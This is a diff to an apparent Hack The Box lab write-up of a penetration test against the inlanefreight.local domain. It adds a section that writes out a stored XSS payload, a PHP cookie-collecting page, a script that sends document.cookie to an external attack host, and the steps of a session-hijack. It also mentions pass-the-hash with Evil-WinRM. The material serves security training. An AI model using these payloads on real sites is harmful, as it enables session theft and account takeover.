@@ -154,7 +154,7 @@ When we paste this command into the text prompt, we get the output "/etc/ not ac
 </script>
 ```
 
-This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}
+This works, and gets us our 7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}
 
 ### Eighth Flag:
 
@@ -984,9 +984,62 @@ inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b1
 inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
 inlanefreight.local\wdill
 ```
-Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. Once we login, we see that we are finally domain and enterprise admin.
+Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. Once we login, we see that we are finally domain and enterprise admin. We can now conclude this penetration test, however if we wanted to do post-exploitation to see if we can access other domains or collect as many credentials as we want, we can do so as well.
 
 We find the final flag on the Administrator's desktop: 7c09eb1fff981654a3bb3b4a4e0d176a
+
+### Eighteenth Flag:
+We have acquired domain/enterprise admin, but there are still some flags that we missed:
+
+In the ticketing system at support.inlanefreight.local/ticket.php, we can create a ticket and see the HTTP request in burpsuite. In the messages box, we can try using a javascript XSS attack with this code:
+```
+"><script src=http://10.10.16.46:9000/TESTING_THIS</script>
+```
+which will try to retrieve a javascript file from an external source at IP 10.10.16.46 which is our attack box. We start a netcat listener and then run the ticket creation with the script in the message box and we successfully receive a connection from the web server:
+```
+Connection received on 10.129.129.129 42514
+GET /TESTING_THIS%3C/script HTTP/1.1
+Host: 10.10.16.46:9000
+Connection: keep-alive
+User-Agent: HTBXSS/1.0
+Accept: */*
+Referer: http://127.0.0.1/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+We can now setup index.php which will accept and collect cookie parameters as well as a script.js file that appends the web server's cookies to the index.php file.
+index.php:
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+and
+script.js
+```
+new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
+```
+Then we can setup a php server:
+```
+sudo php -S 0.0.0.0:9200
+```
+and then insert the javascript code that calls our script.js file
+```
+"><script src=http://10.10.16.46:9200/script.js</script>
+```
+which gives us the cookie on our netcat listener. We can then use a browser cookie editor to insert the cookie named "session" on our browser and press the login button on the top right and we should get our eighteenth flag:
+```
+HTB{1nS3cuR3_c00k135}
+```
+### Nineteenth Flag
 
 
 
